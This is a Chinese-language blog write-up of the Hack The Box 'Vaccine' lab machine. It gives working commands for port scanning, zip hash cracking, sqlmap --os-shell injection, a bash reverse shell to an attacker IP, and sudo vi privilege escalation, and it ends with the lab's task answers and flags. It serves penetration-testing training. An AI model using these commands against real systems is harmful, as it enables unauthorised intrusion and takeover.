---
title: Hack the box Vaccine题解
tags: 
  - HTB
  - 渗透测试
permalink: /archives/28632/
published: 2023-04-02 12:10:06
---

>  在打靶机的时候网络有点问题，所以这份WP里的目标机器的IP前后是不一样的，但总的来说，方法大同小异

 # 扫端口

```shell
nmap -sC -sV 10.129.252.99
```

![image-20230402121345323](./images/image-20230402121345323.png)

开启了21、22和80端口，访问80端口，什么都没有，结合任务1和任务2，就直接练上去看有没有东西

![image-20230402131255007](./images/image-20230402131255007.png)

# ftp

连上以后把文件复制出来

![image-20230402131346467](./images/image-20230402131346467.png)

# 破解zip密码

解压的时候发现是有密码的

![image-20230402131602635](./images/image-20230402131602635.png)

看到任务4，和经过百度知道利用`zip2john`去获取压缩包的`hash`值，然后使用`john`去破解`hash`值

![image-20230402131644512](./images/image-20230402131644512.png)

破解成功

![image-20230402132032683](./images/image-20230402132032683.png)

# backup的内容

得到了两个文件

![image-20230402132448632](./images/image-20230402132448632.png)

其中`index.php`里面有网站的管理员账号和密码，密码经过了md5加密，经过破解得到：`qwerty789`，这也是任务5的答案

![image-20230402132520686](./images/image-20230402132520686.png)

![image-20230402132605551](./images/image-20230402132605551.png)

# sql注入

登录到后台后有个搜索框尝试有无sql注入，发现可注入，加上任务6的提示，那就直接`sqlmap`一把梭

![image-20230402204507038](./images/image-20230402204507038.png)

用`burpsuite`抓包保存到1.txt后，利用sqlmap进行注入，并利用`--os-shell`进行执行`shell`的命令

![image-20230402223030330](./images/image-20230402223030330.png)

- 注入命令：

```shell
sqlmap -r 1.txt --os-shell 
```

# 反弹shell

- 攻击机监听

```shell
nc -lvvp 1234
```

- 在`--os-shell`里执行

```shell
bash -c "bash -i >& /dev/tcp/10.10.14.13/1234 0>&1"
```

在网站的根目录下的`dashboard.php`里发现了数据库的一个账号的密码

![image-20230402223929668](./images/image-20230402223929668.png)

```
账号：postgres
密码：P@s5w0rd!
```

# 提权

在前面的端口扫描里看到这台机器是开启了22端口的，尝试使用上面得到的账号密码去登陆（想要用这个是因为为反弹shell后并不稳定，老是掉线，所以就换另一个方法），可以成功登录![image-20230402224519697](./images/image-20230402224519697.png)

使用命令`suo -l`查看`postgres`能执行的高级权限的命令

![image-20230402224934023](./images/image-20230402224934023.png)

发现有一个命令是：

```shell
(ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf
```

然后看官方的wp得知，可以利用vi进行提权

>首先运行命令：sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
>输入`:`切换命令模式输入：set shell=/bin/sh
>
>在按一次`:`切换到命令模式输入：shell

然后就切换到了`root`用户

![image-20230402230044265](./images/image-20230402230044265.png)

# 答案

> 1. FTP
> 2. anonymous
> 3. backup.zip
> 4. zip2john
> 5. qwerty789
> 6. --os-shell
> 7. vi
> 8. ec9b13ca4d6229cd5cc1e09980965bf7
> 9. dd6e058e814260bc70e9bbdef2715849

# 参考博客

[hack the box靶场Vaccine靶机](https://blog.csdn.net/zr1213159840/article/details/123693695)

[渗透测试练习靶场hackthebox——Starting Point Vaccine攻略（内附各种bug解决方案）](https://blog.csdn.net/m0_48066270/article/details/108696605)
